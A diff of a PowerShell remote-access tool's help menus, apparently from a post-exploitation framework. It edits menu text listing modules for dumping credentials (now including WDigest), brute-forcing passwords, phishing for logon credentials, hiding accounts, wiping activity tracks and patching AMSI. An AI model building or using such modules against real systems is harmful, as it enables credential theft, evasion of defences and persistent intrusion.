@@ -2040,7 +2040,8 @@ While($Client.Connected)
          write-host "   Warning: Total of 3 max multiple ports accepted. (Create)" -ForegroundColor Yellow;
          write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
          write-host "   -------   -----------                     -------------------";
-         write-host "   Query     Query 'active' firewall rules   UserLand";
+         write-host "   Query     Query 'active' firewall rules   " -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
          write-host "   Create    Block application\program rule  " -NoNewline
          write-host "Administrator" -ForegroundColor Red;
          write-host "   Delete    Delete sellected firewall rule  " -NoNewline
@@ -2389,7 +2390,7 @@ While($Client.Connected)
       write-host "   Artifacts   Clean remote host activity tracks";
       write-host "   HiddenDir   Super\hidden directorys manager";
       write-host "   hideUser    Remote hidden accounts manager";
-      write-host "   Passwords   Dump credentials (vault|dpapi|files)";
+      write-host "   Passwords   Dump (vault|dpapi|files|WDigest)";
       write-host "   BruteAcc    Brute-force user account password";
       write-host "   PhishCred   Promp remote user for logon creds";
       write-host "   AMSIpatch   Disable AMS1 within current process";
